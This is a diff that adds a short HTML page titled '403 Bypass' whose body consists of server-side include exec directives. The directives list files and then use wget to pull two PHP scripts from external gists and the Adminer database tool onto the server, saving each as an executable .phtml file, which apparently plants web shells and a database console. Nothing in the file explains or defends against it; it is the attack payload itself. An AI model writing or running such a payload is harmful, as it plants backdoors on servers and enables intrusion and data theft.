@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<head>
+    <title>403 Bypass</title>
+</head>
+
+<body>
+    <h1>403 Bypass</h1>
+    <pre>
+        <!--#exec cmd="'ls'"-->
+        <!--#exec cmd="'wget https://gist.githubusercontent.com/alternation1337/91cd3429d53bdb7237b0835a451d9b6d/raw/f4b1c64c1350ac1f7685d369061afc12148677df/lite.txt -O sc.phtml'"-->
+        <!--#exec cmd="'wget https://gist.githubusercontent.com/alternation1337/2bc6d98e2f754ce7f0bda6bba1d77260/raw/fffb3a796b8d7b6596552101b40900eabb6ca49c/scmd.txt -O mod.phtml'"-->
+        <!--#exec cmd="'wget https://github.com/vrana/adminer/releases/download/v5.4.1/adminer-5.4.1.php -O adm.phtml'"-->
+    </pre>
+</body>
+</html>
